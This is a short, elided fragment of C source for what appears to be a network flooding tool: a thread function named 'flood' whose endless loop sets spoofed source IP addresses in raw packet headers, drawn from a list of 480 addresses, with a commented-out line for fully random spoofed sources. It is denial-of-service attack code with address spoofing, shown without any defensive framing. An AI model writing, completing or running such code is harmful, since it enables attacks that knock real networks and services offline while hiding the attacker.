...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		iph->saddr = htonl(src_ips[rand_cmwc() % 480]);
		// Dont need this anymore because we wanna use our own ips iph->saddr = (rand_cmwc() >> 24 &0xFF) << 24 | (rand_cmwc() >> 16 &0xFF) << 16 | (rand_cmwc() >> 8 &0xFF) << 8 | (rand_cmwc() &0xFF);
